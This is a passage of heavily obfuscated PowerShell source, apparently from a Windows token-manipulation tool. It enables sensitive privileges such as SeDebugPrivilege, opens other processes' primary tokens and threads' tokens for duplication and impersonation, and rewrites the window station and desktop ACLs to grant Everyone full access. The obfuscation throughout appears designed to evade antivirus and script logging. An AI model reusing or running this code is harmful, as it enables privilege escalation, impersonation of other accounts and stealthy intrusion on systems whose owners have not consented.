        if (${t`HreA`DH`AndlE} -eq   (gi ("V"+"ari"+"ab"+"Le:Il0mT")  ).vaLuE::"ZE`RO")
        {
            Throw ("{1}{9}{5}{2}{7}{0}{6}{4}{10}{3}{8}{12}{11}"-f'et the','U','o ','le','n','able t',' ha','g',' to t','n','d','thread','he current ')
        }
        
        [IntPtr]${tHREAD`T`O`ken} =   (  vARiabLE ('IL0M'+'T')  -vaLueon  )::"Ze`RO"
        [Bool]${rEsu`LT} = ${op`eNTh`R`eADt`okEN}."i`NvOKe"(${tHre`Adh`AN`dlE}, ${WiN`32c`ONs`T`AnTs}."t`OKeN_`quErY" -bor ${W`I`N32C`ONSt`Ants}."ToKen_a`D`juS`T_PRIVILEgES", ${f`A`LSe}, [Ref]${th`R`eADTokEN})
        ${ER`Ro`RCoDE} =   (cHIlDItEM  ('varIaBle'+':'+'a2'+'S')).VALUE::("{4}{3}{0}{2}{1}" -f '32Er','or','r','astWin','GetL').Invoke()

        if (${re`sult} -eq ${F`A`LSe})
        {
            if (${Er`RORCO`DE} -eq ${WIn`32coN`sTA`Nts}."e`RroR`_No_tO`k`En")
            {
                ${reSu`LT} = ${IMPe`RS`onatE`SELf}."I`NVO`Ke"(${wi`N32cO`N`staNts}."sEcuR`ITY_D`eLeGAt`iON")
                if (${Re`s`Ult} -eq ${F`ALsE})
                {
                    Throw (&("{0}{2}{1}" -f 'Ne','ject','w-Ob') ("{2}{0}{4}{3}{1}" -f 'i','ption','ComponentModel.W','ce','n32Ex'))
                }
                
                ${R`eSu`Lt} = ${oP`En`ThrEAdT`Ok`eN}."Invo`kE"(${thrE`A`DhANDle}, ${Win32`Co`NS`TAn`Ts}."T`OKe`N_Qu`erY" -bor ${wiN32CoNs`T`AN`Ts}."tOk`e`N_AdJusT`_pRiV`IlE`GES", ${fa`l`Se}, [Ref]${THRe`Ad`T`OKeN})
                if (${R`es`UlT} -eq ${fa`Lse})
                {
                    Throw (&("{1}{2}{0}"-f 'Object','Ne','w-') ("{2}{3}{5}{4}{0}{1}" -f'cepti','on','ComponentModel.Wi','n3','x','2E'))
                }
            }
            else
            {
                Throw ([ComponentModel.Win32Exception] ${ErRo`RCo`dE})
            }
        }

        ${Cl`OsEHAND`LE}."I`NvOke"(${th`Readhan`D`le}) | &("{0}{2}{1}"-f 'O','-Null','ut')
    
        ${LuidS`I`ZE} =   $a2S::"S`iz`eOF"([Type]${L`UiD})
        ${lui`dP`Tr} =   $A2s::("{3}{0}{2}{1}" -f'cHGl','bal','o','Allo').Invoke(${lUId`si`zE})
        ${L`UId`o`BJeCT} =   $a2S::"ptrTo`ST`R`UCTure"(${LU`i`DPTr}, [Type]${l`UID})
          ( gCI  ("{2}{1}{3}{0}" -f'a2s','IabL','vAr','e:') ).Value::("{2}{1}{0}"-f 'bal','o','FreeHGl').Invoke(${L`UIDP`TR})

        ${Re`sULT} = ${l`OOKupp`RI`ViL`EgE`VALue}."I`Nv`okE"(${NU`ll}, ("{1}{5}{6}{4}{0}{2}{3}"-f'i','SeA','le','ge','nPriv','ssignP','rimaryToke'), [Ref] ${LUiD`o`B`JECT})

        if (${r`esU`LT} -eq ${FaL`se})
        {
            Throw (&("{2}{1}{0}"-f'ct','Obje','New-') ("{2}{1}{0}{4}{3}"-f'32Exc','omponentModel.Win','C','ion','ept'))
        }

        [UInt32]${Lu`id`And`AttRIbutESs`Ize} =   $a2s::"SIze`OF"([Type]${lUiD`_`AND_A`TtrIBu`TeS})
        ${LUiDandATt`R`IBu`Te`sptr} =   ( GEt-VaRIABLE  ("a2"+"s")).VaLuE::("{1}{0}{2}" -f'cHGlob','Allo','al').Invoke(${LUIdAnDa`Ttr`I`BU`TE`SSI`ZE})
        ${l`Ui`DANdATTRIbuT`ES} =  (  item  ("{0}{3}{2}{1}"-f 'vaR','a2s','Le:','IAb')  ).vaLUe::"P`Trtos`T`RUctUre"(${lu`IDANdaTTrI`Bu`TESp`Tr}, [Type]${LUI`d_A`ND`_Attrib`Utes})
         (  gi  ("{3}{2}{0}{1}"-f'aBl','E:A2s','RI','VA') ).vAlUe::("{0}{2}{1}"-f 'Fre','al','eHGlob').Invoke(${lui`D`AN`dAtTRib`UtES`pTr})

        ${lu`I`dAnDAt`TribuTeS}."l`UiD" = ${lUI`DOBJ`E`Ct}
        ${lu`IDA`N`dAtTRIBut`es}."AttRIb`U`TEs" = ${WiN`32c`oN`sta`Nts}."sE_`Pr`IVIL`ege_en`ABleD"

        [UInt32]${TO`K`e`Npr`IVsizE} =  (  ChiLDitem ("{2}{3}{1}{0}"-f'2s',':A','VariAb','Le')).vaLUe::"s`IZe`oF"([Type]${TOk`en`_Pr`IViLegEs})
        ${tO`KEN`pR`ivileGeSp`Tr} =   ( GcI  ('v'+'arIABle:'+'A2S')).ValUe::("{2}{0}{1}{3}"-f 'oc','HGlob','All','al').Invoke(${tOKeN`P`Riv`si`Ze})
        ${to`Ke`N`p`RiVILE`gEs} =  $a2s::"p`TrTOSt`RUctu`Re"(${tO`KeNPriVILegE`S`ptR}, [Type]${tOken_Pr`I`VIl`EGES})
         ( vARIaBLE  ('A2'+'S') ).VAlue::("{2}{1}{0}"-f 'HGlobal','ree','F').Invoke(${TOkEN`pri`V`I`lEGeSpTR})
        ${t`o`KeNpR`IViL`EgeS}."P`RIvi`lEgec`oU`NT" = 1
        ${TOkE`N`P`RIVILeg`Es}."p`Rivil`eGes" = ${lUi`dANDATT`R`I`BuTES}

        ${gloBAl`:`TokeN`p`RIv} = ${t`Ok`EnPrIVI`lEg`eS}

        ${r`ESu`lT} = ${aDj`U`St`TOKe`NPrI`VilE`ges}."INV`oKE"(${t`HR`eA`dToken}, ${fal`se}, [Ref] ${T`O`KenpRI`Vile`ges}, ${tOkE`Npri`Vsi`ZE},  $iL0mt::"Z`ERO",   $il0Mt::"z`ERo")
        if (${REsU`lT} -eq ${fA`L`sE})
        {
            Throw (&("{1}{0}{2}{3}"-f'-O','New','b','ject') ("{3}{0}{5}{4}{1}{7}{6}{2}{8}" -f 'omp','el','ceptio','C','Mod','onent','2Ex','.Win3','n'))
        }

        ${C`LoSEHan`d`le}."i`NVo`Ke"(${TH`REadto`k`eN}) | &("{0}{1}"-f 'Out-Nu','ll')
    }


    
    function enAB`Le-`p`R`ivI`lEgE
    {
        Param(
            [Parameter()]
            [ValidateSet({"{0}{6}{4}{1}{2}{8}{7}{5}{3}" -f 'S','ssig','n','ilege','A','kenPriv','e','rimaryTo','P'}, {"{1}{2}{0}" -f 'e','SeAu','ditPrivileg'}, {"{2}{0}{3}{1}"-f 'ackupPri','e','SeB','vileg'}, {"{4}{5}{2}{0}{6}{1}{3}"-f'r','v','P','ilege','SeChange','Notify','i'}, {"{1}{4}{5}{3}{2}{0}"-f'ege','SeCrea','l','alPrivi','teGl','ob'},
                {"{0}{2}{4}{1}{3}"-f'SeCreatePag','g','efilePri','e','vile'}, {"{3}{4}{1}{0}{2}{5}"-f 'man','ePer','entPri','SeCrea','t','vilege'}, {"{7}{6}{3}{2}{1}{0}{8}{4}{5}"-f'icLin','eSymbol','at','e','vil','ege','eCr','S','kPri'}, {"{4}{6}{0}{5}{2}{3}{1}"-f 'ateT','lege','enPriv','i','S','ok','eCre'},
                {"{1}{3}{0}{2}" -f 'Privi','SeDebu','lege','g'}, {"{5}{3}{2}{1}{6}{0}{4}{7}"-f 'e','Privi','ation','eEnableDeleg','g','S','l','e'}, {"{0}{4}{6}{3}{2}{1}{5}" -f'SeIm','i','atePriv','n','p','lege','erso'}, {"{8}{7}{6}{3}{4}{9}{0}{2}{5}{1}" -f 'o','ge','rityPr','eB','as','ivile','eas','Incr','Se','ePri'},
                {"{2}{5}{6}{0}{3}{4}{1}" -f'ta','ege','SeIncrea','Priv','il','seQu','o'}, {"{0}{6}{4}{8}{7}{2}{1}{5}{3}" -f'SeIncreas','vi','i','e','orking','leg','eW','etPr','S'}, {"{1}{3}{6}{4}{2}{0}{5}"-f'r','SeL','D','o','d','iverPrivilege','a'}, {"{1}{3}{4}{0}{2}" -f'Privil','SeLoc','ege','kMemo','ry'}, {"{5}{4}{7}{2}{6}{3}{0}{1}"-f 'le','ge','ccountPri','i','ine','SeMach','v','A'},
                {"{0}{5}{4}{3}{2}{1}"-f 'SeM','lege','Privi','ume','nageVol','a'}, {"{7}{2}{4}{5}{6}{8}{3}{1}{0}"-f 'lege','i','ePro','ocessPriv','f','ileS','ingleP','S','r'}, {"{1}{0}{2}{3}"-f 'Re','Se','labelPrivile','ge'}, {"{3}{0}{5}{4}{1}{6}{2}"-f'R','wnPrivile','e','Se','tdo','emoteShu','g'}, {"{3}{1}{0}{2}"-f'Privi','re','lege','SeResto'},
                {"{2}{0}{3}{1}" -f 'eS','ege','S','ecurityPrivil'}, {"{0}{1}{2}{4}{3}" -f'S','eS','hutdownP','vilege','ri'}, {"{3}{1}{5}{4}{2}{0}"-f'ge','SyncA','e','Se','tPrivil','gen'}, {"{6}{3}{0}{5}{7}{8}{2}{4}{1}" -f 'mEn','ge','ri','yste','vile','viron','SeS','men','tP'}, {"{0}{4}{1}{3}{2}{5}" -f 'SeSy','Pro','ePr','fil','stem','ivilege'},
                {"{3}{2}{1}{0}" -f 'rivilege','eP','m','SeSystemti'}, {"{1}{5}{3}{6}{4}{0}{2}" -f 'leg','SeT','e','shi','ivi','akeOwner','pPr'}, {"{1}{2}{0}{3}{4}"-f 'ri','Se','TcbP','vil','ege'}, {"{1}{2}{0}{3}"-f'v','Se','TimeZonePri','ilege'}, {"{2}{3}{4}{0}{5}{1}" -f'ccessP','ege','Se','T','rustedCredManA','rivil'},
                {"{2}{1}{0}{3}{4}"-f 'kPriv','ndoc','SeU','i','lege'}, {"{3}{0}{4}{1}{5}{2}" -f 'icit','nput','vilege','SeUnsol','edI','Pri'})]
            [String]
            ${priv`IL`EGe}
        )

        [IntPtr]${T`Hre`Adh`AN`DlE} = ${gE`TcU`R`R`en`TThread}."iNv`OkE"()
        if (${ThRea`Dha`Nd`le} -eq  (  diR  ("{3}{0}{2}{1}"-f'R','Mt','iable:IL0','vA') ).ValUe::"Ze`Ro")
        {
            Throw ("{9}{8}{7}{5}{2}{11}{0}{3}{10}{4}{6}{1}"-f 'th','ead','et the ','e','u','o g','rrent thr','ble t','na','U',' c','handle to ')
        }
        
        [IntPtr]${THR`e`Adt`OkEn} =   $Il0Mt::"Ze`RO"
        [Bool]${REs`Ult} = ${o`Penth`R`eaDToKEN}."i`NvoKE"(${Thr`EAD`H`ANd`LE}, ${w`i`N32C`OnSTANTS}."TO`ken_`QuERY" -bor ${WiN32coNsT`A`N`Ts}."tO`KEn_adJust_`PRI`VIle`ges", ${F`AlSe}, [Ref]${THR`e`AdT`Oken})
        ${e`RROrC`Ode} =   (  lS  ('v'+'ARIaBL'+'e'+':A2S')).vAlue::("{0}{4}{3}{2}{1}" -f 'GetLas','or','rr','Win32E','t').Invoke()

        if (${R`E`SUlT} -eq ${fa`Lse})
        {
            if (${erRO`Rc`Ode} -eq ${W`i`N3`2CONSTAN`TS}."eR`ROr_nO`_`TOKEn")
            {
                ${r`e`SuLT} = ${IMpERS`o`NA`TeS`ElF}."in`Vo`Ke"(${Wi`N32`coNSt`ANTS}."SEcUri`TY_`dE`Le`Ga`TIon")
                if (${R`es`ULt} -eq ${fA`lSe})
                {
                    Throw (&("{0}{1}{2}" -f'N','ew-Obje','ct') ("{8}{2}{5}{3}{6}{0}{7}{4}{1}" -f 'x','ion','omponent','el.Win32','ept','Mod','E','c','C'))
                }
                
                ${reS`ULt} = ${OPENtHREA`D`T`OK`En}."invo`Ke"(${t`h`REad`Han`DLE}, ${wIN32cO`NStA`N`TS}."TO`KEN_qU`E`RY" -bor ${wI`N32c`OnsTa`N`TS}."To`K`en_A`d`Just_PRI`VIlEgeS", ${fal`Se}, [Ref]${t`HR`eADT`oKEN})
                if (${ReS`U`Lt} -eq ${f`AL`sE})
                {
                    Throw (&("{2}{1}{0}"-f'ect','w-Obj','Ne') ("{4}{2}{5}{3}{0}{1}"-f 'i','on','Model','Except','Component','.Win32'))
                }
            }
            else
            {
                Throw ([ComponentModel.Win32Exception] ${e`RrOr`COdE})
            }
        }

        ${C`lOse`HaN`DlE}."in`V`OKe"(${THrE`AD`haNDLE}) | &("{1}{0}"-f'ut-Null','O')
    
        ${LuI`Dsi`ze} =   (  VARIAbLE  ("{1}{0}" -f 's','a2') ).VaLuE::"s`IZEOf"([Type]${LU`ID})
        ${LUI`dpTr} =  $A2S::("{1}{2}{0}" -f 'Global','All','ocH').Invoke(${lUi`D`SiZE})
        ${Lu`IDob`jeCT} =  ( GET-VARiAble ("A"+"2S")  -VAlUeon  )::"ptr`TO`ST`RU`cTure"(${lU`Id`PTr}, [Type]${l`Uid})
         (  GeT-iteM  ("{2}{1}{0}{3}"-f 'a','RIABle:','VA','2s') ).vaLue::("{0}{1}{3}{2}" -f'Fr','e','Global','eH').Invoke(${lUiD`ptR})

        ${RES`ULT} = ${LO`OKu`p`PrIvileG`eVALuE}."in`Voke"(${n`ULL}, ${PR`IVI`Lege}, [Ref] ${Lu`ID`o`BJECT})

        if (${Resu`lT} -eq ${Fa`lsE})
        {
            Throw (&("{0}{1}{2}"-f 'N','ew-Objec','t') ("{2}{1}{6}{3}{4}{7}{0}{5}" -f '2Exce','o','C','en','tModel.W','ption','mpon','in3'))
        }

        [UInt32]${L`UidAndA`TtRIB`UTES`s`iZe} =  ( VaRIaBle ("{1}{0}"-f'S','a2')  ).VaLUE::"Siz`e`Of"([Type]${lui`d_`ANd`_At`TR`IbuTEs})
        ${l`U`IDa`Nda`T`T`RiBUtESPtR} =  ( get-varIABLE  ("{0}{1}"-f'a2','s')  -VALu)::("{1}{0}{3}{2}"-f 'l','A','bal','locHGlo').Invoke(${lUI`dA`ND`ATtRibUT`eSSIze})
        ${LuiD`AnDA`Ttri`BUT`Es} =   $A2s::"P`TRtOsT`RUctURe"(${lUIdaN`Da`TTR`ibUTE`S`ptr}, [Type]${L`Ui`d_`A`ND_`AttrIb`UTeS})
         (GeT-vARIaBLE ("a"+"2S")  -ValUEo )::("{2}{0}{3}{1}" -f 'Gl','bal','FreeH','o').Invoke(${l`UIdaNDatt`RIb`U`Tes`ptR})

        ${l`UId`ANdA`Ttrib`UTEs}."Lu`Id" = ${luIDo`B`Ject}
        ${Lu`id`ANdAtTr`iBUtES}."a`TTrIB`UteS" = ${wIn3`2coNSta`NTs}."SE_`pr`ivILE`ge_e`Na`BlED"

        [UInt32]${TO`ke`NPrIvsIze} =  $A2S::"Si`zeOF"([Type]${tokE`N`_PRiV`i`LEges})
        ${TOKE`Np`RI`VilE`GE`sp`Tr} =   ( vaRiAble  ("A"+"2S") -vALU )::("{2}{0}{1}"-f'llocHGloba','l','A').Invoke(${TOKE`NprI`VS`iZE})
        ${TOK`eNP`RIV`iL`egES} =  $A2S::"P`T`RTos`TruCTuRE"(${tOKe`N`Pri`V`iL`EGesPtr}, [Type]${tOK`E`N`_`pRi`VIleGEs})
          (  Ls ("vA"+"R"+"Ia"+"ble:a2s")  ).vALUE::("{0}{2}{1}" -f 'F','HGlobal','ree').Invoke(${tokENpR`Iv`i`l`EgeSpTR})
        ${tok`EnpR`ivI`LE`gES}."pr`IviL`EGEco`UnT" = 1
        ${t`OKe`NP`RIVILEG`es}."pR`IV`IlEg`es" = ${lu`I`DaNDat`T`RI`BUtES}

        ${GlobaL:`TOKenp`R`iv} = ${t`oKeN`pR`IVI`LEGES}

        &("{2}{1}{0}" -f 'e','e-Verbos','Writ') ('Attemp'+'ti'+'ng '+'to'+' '+'e'+'na'+'ble '+'p'+'ri'+'vileg'+'e: '+"$Privilege")
        ${RESU`lT} = ${adj`U`stTo`K`EnP`RIvi`LEgEs}."iNvO`kE"(${t`HR`eADt`OkeN}, ${F`A`LSe}, [Ref] ${TO`keN`P`RiVILEGeS}, ${t`oKeN`Pr`iv`SiZe},   (VariABle ("{0}{1}" -f 'i','L0MT')  ).vAlUE::"Z`ERo",  (  Get-vAriAbLE  ("{0}{1}" -f 'Il0m','t') -vAL  )::"ze`Ro")
        if (${r`e`sult} -eq ${fa`LSE})
        {
            Throw (&("{1}{0}{2}" -f 'Ob','New-','ject') ("{2}{6}{5}{1}{4}{3}{0}"-f'n','entMo','C','32Exceptio','del.Win','on','omp'))
        }

        ${c`lOS`ehAn`dlE}."In`V`oKe"(${T`HReAdT`O`KeN}) | &("{1}{0}{2}"-f 'u','O','t-Null')
        &("{2}{4}{0}{3}{1}"-f 'te','erbose','Wr','-V','i') ('Enabl'+'ed '+'priv'+'il'+'ege:'+' '+"$Privilege")
    }


    
    function sET-`D`eSKTOpAc`Ls
    {
        &("{1}{0}{2}{3}" -f '-','Enable','P','rivilege') -Privilege ("{1}{0}{4}{2}{3}" -f 'eSe','S','i','tyPrivilege','cur')

        
        ${wi`Ndo`w`sTATio`N`sTR} =  $a2s::("{4}{1}{0}{2}{3}"-f'oba','oHGl','lU','ni','StringT').Invoke(("{2}{1}{0}" -f'a0','t','WinS'))
        ${hWi`NSTA} = ${oPE`Nw`ind`OWs`TaTIoNw}."in`VO`Ke"(${W`InDow`s`TatI`ON`sTR}, ${f`ALsE}, ${WiN32Co`Ns`Ta`NTs}."acCess_`sYs`T`EM_`sEcUR`i`TY" -bor ${wI`N32cOns`T`A`Nts}."REa`D_Co`NTRol" -bor ${win32cON`Sta`NTS}."Wr`itE_DAc")

        if (${h`W`iNsTA} -eq   $IL0mT::"z`ero")
        {
            Throw (&("{1}{0}{2}" -f'bje','New-O','ct') ("{7}{2}{0}{4}{8}{6}{5}{1}{3}" -f'nen','pt','mpo','ion','tMode','Win32Exce','.','Co','l'))
        }

        &("{2}{4}{1}{3}{0}{7}{5}{6}" -f 'Al','ktopAC','Set-','LTo','Des','Everyon','e','low') -hObject ${h`WiN`sTA}
        ${cl`oseHAN`dlE}."iNv`OKE"(${hwIN`STA}) | &("{2}{0}{1}"-f 'Nul','l','Out-')

        
        ${HDeSkT`op} = ${o`penD`EsK`TOPA}."iN`VOke"(("{0}{1}" -f 'defau','lt'), 0, ${fAL`Se}, ${WIn3`2`ConSt`A`Nts}."dE`sktop_gen`eRIc`_`All" -bor ${WIn3`2con`St`A`NTS}."wR`Ite_d`AC")
        if (${HD`esk`Top} -eq  (GET-varIablE ("I"+"L0mt")  ).valuE::"zE`Ro")
        {
            Throw (&("{1}{0}{2}" -f 'j','New-Ob','ect') ("{0}{1}{6}{4}{2}{3}{8}{5}{7}"-f 'Com','pone','l.W','i','Mode','c','nt','eption','n32Ex'))
        }

        &("{3}{1}{7}{8}{4}{5}{2}{0}{6}"-f'r','sktop','owEve','Set-De','L','ToAll','yone','A','C') -hObject ${h`DEs`KTOp}
        ${clOs`ehaN`dLe}."iNv`oKe"(${H`DEskT`oP}) | &("{2}{1}{0}" -f 't-Null','u','O')
    }


    function S`Et`-D`eSkTopaCl`T`Oal`Lo`WEVEr`YOne
    {
        Param(
            [IntPtr]${hOBj`eCT}
            )

        [IntPtr]${p`Psi`D`OwNer} =   $iL0Mt::"z`ERO"
        [IntPtr]${pPsI`dGro`Up} =   $il0MT::"ze`RO"
        [IntPtr]${P`PDACL} =   (ls ("{0}{2}{1}"-f'VarIABLe','IL0MT',':') ).valuE::"Z`ero"
        [IntPtr]${PPSA`CL} =   $il0MT::"Ze`Ro"
        [IntPtr]${p`pSecURityd`E`sCRipt`or} =  (Ls ("{3}{1}{2}{0}"-f'0MT','Ri','aBLE:il','vA')  ).valuE::"Z`ERO"
        
        ${R`etvAL} = ${g`eTSeCu`RIT`Y`INfO}."inV`o`KE"(${h`obje`cT}, 0x7, ${win3`2`CO`NsTanTs}."D`AcL_SEC`U`RiTY_I`N`FOrmat`Ion", [Ref]${PP`SIDO`wn`Er}, [Ref]${pPSiDG`R`O`Up}, [Ref]${P`PDaCL}, [Ref]${p`psaCL}, [Ref]${pPSECURIt`YdE`s`CRI`Pt`or})
        if (${R`e`TVaL} -ne 0)
        {
            &("{2}{0}{1}"-f'ite','-Error','Wr') ('U'+'nable '+'t'+'o '+'c'+'all '+'Get'+'Secu'+'rityIn'+'fo. '+'Erro'+'rCo'+'de: '+"$retVal")
        }

        if (${P`P`dacl} -ne  $IL0MT::"z`Ero")
        {
            ${AC`lOBJ} =  ( get-iTem  ("{0}{3}{2}{1}" -f'VAriAbL','s','2','E:A') ).VaLUE::"ptRt`Ost`RucTU`Re"(${P`Pd`Acl}, [Type]${a`Cl})

            
            [UInt32]${RE`A`lSi`zE} = 2000
            ${p`AlLuSeR`SSiD} =   (GEt-vARIAblE ("a"+"2S") ).VaLue::("{2}{0}{1}"-f 'lloc','HGlobal','A').Invoke(${rE`Alsi`ZE})
            ${SuC`c`ESS} = ${CREaTEw`EL`LKno`WnSId}."i`NvOKE"(1,   (DiR  ("v"+"ar"+"Iab"+"lE:iL0MT")  ).ValUE::"zE`Ro", ${PaL`L`USerss`ID}, [Ref]${r`E`ALs`IzE})
            if (-not ${Su`CCeSS})
            {
                Throw (&("{2}{0}{1}" -f'w-Obj','ect','Ne') ("{6}{1}{3}{4}{0}{5}{2}" -f'32','ompo','ption','nentMo','del.Win','Exce','C'))
            }

            
            ${T`RusteeS`iZe} =  (  ITEm  ("{3}{0}{2}{1}" -f 'arIablE:','s','A2','v') ).valUe::"sI`z`EOF"([Type]${TrUSt`ee})
            ${t`RuS`T`eePTr} =  ( gET-vAriabLE  ('A'+'2S')).vaLue::("{0}{3}{1}{2}"-f 'A','ocHGlob','al','ll').Invoke(${tr`USTees`ize})
            ${T`RusTEe`ObJ} =   (iteM ('VARI'+'aBl'+'E'+':A2s') ).vaLUE::"pT`RTos`TRuCtU`RE"(${trU`ste`epTR}, [Type]${trUst`Ee})
             $a2S::("{2}{0}{1}" -f 'Glo','bal','FreeH').Invoke(${t`RUSTeEp`TR})
            ${T`Rust`EEoBj}."pmUl`Ti`p`Le`TrU`STEE" =  (gEt-varIable  ("iL0M"+"T")).valUe::"Z`ERO"
            ${t`RuS`TE`EObJ}."MUl`TIpLet`RuS`TeeoPE`RAtioN" = 0
            ${T`R`US`TeEObJ}."T`RUSt`EeF`OrM" = ${wIn3`2CO`NS`TANtS}."t`RU`sTe`E_Is_sId"
            ${TR`U`stEE`OBj}."tRUsteet`Y`PE" = ${W`i`N3`2Consta`NTs}."TRU`S`TEe_I`S_WELl`_`knoW`N_gr`Oup"
            ${Tr`UStEe`o`BJ}."p`TSTrN`AME" = ${pallU`S`eRSsId}

            
            ${EXP`lIc`ItA`CceS`sS`I`zE} =   (  GeT-VaRiaBLe  ("{0}{1}"-f'A2','S')).vaLUE::"sIZ`eOf"([Type]${EXP`lI`cIt_`ACceSs})
            ${exPlic`I`TAc`CesSP`Tr} =  $a2S::("{1}{2}{0}{3}" -f'Gl','Al','locH','obal').Invoke(${exP`L`I`cIT`AcceS`SsiZe})
            ${E`XP`LICItaC`CEsS} =  (vaRIABLE ("{0}{1}" -f 'A','2S')  -ValUE)::"pT`Rt`OST`RUCTure"(${eXpLi`cITA`CCE`S`SptR}, [Type]${ExP`L`iCIt_ACce`SS})
              (  VArIaBLe ("a"+"2S")  -va)::("{0}{2}{1}" -f'FreeHG','obal','l').Invoke(${ex`plIcIta`CCeSSp`Tr})
            ${Exp`LI`C`ITACcess}."gr`F`A`Cc`eSSPErmissIONS" = 0xf03ff
            ${EX`pLIc`IT`AC`ceSs}."G`RFaCCeSs`m`odE" = ${wI`N3`2cOn`StAntS}."gRAnT`_acc`ess"
            ${e`xpL`IcitACcESS}."Grf`i`NherITa`N`Ce" = ${WI`N32`c`oNsTAnTS}."O`BjE`C`T_iNhERiT`_ACE"
            ${exPl`ICiT`A`ccESs}."t`RUsT`ee" = ${T`RUsT`EEoBJ}

            [IntPtr]${n`ew`DACL} =  (gET-VAriAbLe ("{1}{0}" -f'T','Il0m')  ).VALUe::"z`ErO"

            ${RE`T`Val} = ${s`eT`enTRiesiN`ACLW}."Inv`okE"(1, [Ref]${e`XPliCiTaCC`e`ss}, ${Pp`d`Acl}, [Ref]${nEw`Da`CL})
            if (${rET`VAl} -ne 0)
            {
                &("{2}{0}{1}{3}" -f'e-E','rro','Writ','r') ('Error'+' '+'calli'+'n'+'g '+'Se'+'tEnt'+'riesIn'+'A'+'c'+'lW: '+"$RetVal")
            }

              (GEt-VaRIAble  ("a"+"2S") ).ValUE::("{2}{3}{0}{1}"-f'a','l','Free','HGlob').Invoke(${pAlLUs`e`Rss`ID})

            if (${n`Ewd`ACL} -eq   (dIr ("{2}{0}{3}{1}" -f 'le:il','t','vAriAB','0m')  ).VALUE::"zE`Ro")
            {
                throw ("{1}{2}{3}{0}" -f'CL is null','N','ew D','A')
            }

            
            ${re`Tv`Al} = ${S`e`TseC`URITyI`N`FO}."InV`oKe"(${Ho`Bje`cT}, 0x7, ${win32`C`O`Ns`TANTS}."D`AcL`_S`e`CURIT`y_INfor`mation", ${pp`sId`OWN`Er}, ${PpS`IdG`R`OUp}, ${n`Ew`dACL}, ${p`PsaCl})
            if (${Retv`AL} -ne 0)
            {
                &("{2}{0}{1}"-f 'ite-','Error','Wr') ('Se'+'tSe'+'cur'+'ity'+'Inf'+'o '+'faile'+'d.'+' '+'Retu'+'rn '+'val'+'ue:'+' '+"$RetVal")
            }

            ${L`Oc`AlfReE}."I`Nv`okE"(${PP`SeCUrIt`ydEScr`iP`TOr}) | &("{2}{1}{0}" -f'l','Nul','Out-')
        }
    }


    
    function gE`T-`P`RIMa`RYtok`en
    {
        Param(
            [Parameter(PosItioN=0, mAnDAtory=${tR`UE})]
            [UInt32]
            ${Pr`oCE`ssiD},

            
            [Parameter()]
            [Switch]
            ${F`UlLp`R`iVs}
        )

        if (${FU`LLP`RIVS})
        {
            ${tokEN`p`Ri`VS} = ${wi`N3`2coNsTA`NtS}."t`Ok`EN_al`l_Ac`cESs"
        }
        else
        {
            ${TOkeN`PR`i`VS} = ${WiN32`C`OnsTaN`Ts}."TOKe`N_ASs`Ig`N_PRIM`ARY" -bor ${WIN`32c`oN`stAnTS}."TOK`EN`_D`UPlicate" -bor ${wiN32`C`onSTaN`TS}."tOKeN`_iMpe`RSO`NAtE" -bor ${Win`32`COn`StanTS}."tOk`EN_Q`UE`Ry" 
        }

        ${r`eTUrnST`RuCt} = &("{2}{1}{0}"-f 'Object','-','New') ("{0}{1}" -f'PSOb','ject')

        ${hPr`O`CEss} = ${OpENpr`O`C`eSs}."In`VOKE"(${wIN32`consTa`Nts}."pRocE`S`s_qUE`Ry_`InFORMaT`IoN", ${t`RuE}, [UInt32]${Pr`o`ce`ssiD})
        ${ReTURnS`Tr`U`cT} | &("{0}{3}{1}{2}"-f'A','d-Memb','er','d') -MemberType ("{0}{3}{1}{2}" -f 'N','t','y','oteProper') -Name ("{1}{2}{0}" -f 'ocess','hP','r') -Value ${H`p`Ro`CesS}
        if (${HPROCE`sS} -eq  $iL0mt::"ze`RO")
        {
            
            ${ERr`OR`COde} =   ( variABle ("A2"+"S") -Va)::("{3}{2}{1}{0}{4}" -f'n32Erro','Wi','etLast','G','r').Invoke()
            &("{1}{0}{2}{3}" -f'e','Writ','-Verb','ose') "Failed to open process handle for ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error code: $ErrorCode . This is likely because this is a protected process. "
            return ${N`ULL}
        }
        else
        {
            [IntPtr]${hPROC`T`OK`eN} =   (  Dir  ("v"+"Ari"+"Able:IL0MT")  ).VAlue::"Z`ero"
            ${su`Cce`ss} = ${OPE`Np`RO`CESsTokEn}."In`VokE"(${hp`RoCe`Ss}, ${Tok`eNPR`i`VS}, [Ref]${H`pRoCTo`kEn})

            
            if (-not ${C`lO`s`eHAnDlE}."i`NVOkE"(${H`p`Ro`cESs}))
            {
                ${erR`o`RCOde} =   (  ChilDitEM ("v"+"ARIab"+"le:A2S")).VAlue::("{3}{1}{2}{0}" -f 'Error','LastW','in32','Get').Invoke()
                &("{0}{2}{1}"-f'Write','ning','-War') ('F'+'ailed '+'to'+' '+'cl'+'ose '+'pr'+'oce'+'ss '+'ha'+'ndl'+'e, '+'this'+' '+'is'+' '+'u'+'nexpected'+'. '+'Er'+'ror'+'Code: '+"$ErrorCode")
            }
            ${hPrOC`EsS} =   $iL0mT::"Z`ERO"

            if (${S`UCCe`ss} -eq ${F`ALse} -or ${H`prOCT`OkEN} -eq   ( DiR  ("{3}{0}{2}{4}{1}"-f'B','T','l','variA','e:il0m')  ).VALUe::"z`erO")
            {
                ${er`RORco`DE} =  ( gEt-vARIABlE  ("{0}{1}" -f 'A','2s') -vaLUEonL)::("{2}{3}{0}{1}" -f'2Err','or','GetLas','tWin3').Invoke()
                &("{3}{2}{0}{1}" -f '-Warni','ng','te','Wri') "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode "
                return ${nU`Ll}
            }
            else
            {
                ${re`T`Ur`NsTru`Ct} | &("{2}{0}{1}" -f'Mem','ber','Add-') -MemberType ("{2}{0}{1}"-f 'ePr','operty','Not') -Name ("{2}{1}{0}" -f 'ocToken','r','hP') -Value ${h`pr`ocToKen}
            }
        }

        return ${rEtUrNsT`R`U`ct}
    }


    function g`ET-`THREAD`To`kEN
    {
        Param(
            [Parameter(POSITIoN=0, MaNdatOry=${Tr`UE})]
            [UInt32]
            ${ThRe`Ad`id}
        )

        ${t`okE`NP`RiVs} = ${W`In3`2ConSt`A`NTs}."ToKeN_`ALL`_`AC`CESS"

        ${ReT`sTRu`CT} = &("{0}{1}{2}" -f'Ne','w-Objec','t') ("{0}{1}{2}" -f 'PS','Ob','ject')
